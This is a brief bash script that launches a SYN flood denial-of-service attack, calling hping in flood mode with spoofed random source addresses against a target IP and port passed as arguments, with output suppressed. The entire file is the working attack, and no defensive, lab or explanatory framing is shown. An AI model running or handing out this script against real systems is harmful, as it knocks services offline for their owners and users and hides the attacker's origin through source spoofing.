#!/bin/bash

# ------ ARGUMENTS ------
TARGET_IP=$1
TARGET_PORT=$2

# > /dev/null - run command but hide output
hping --flood -S -p $TARGET_PORT --rand-source $TARGET_IP > /dev/null
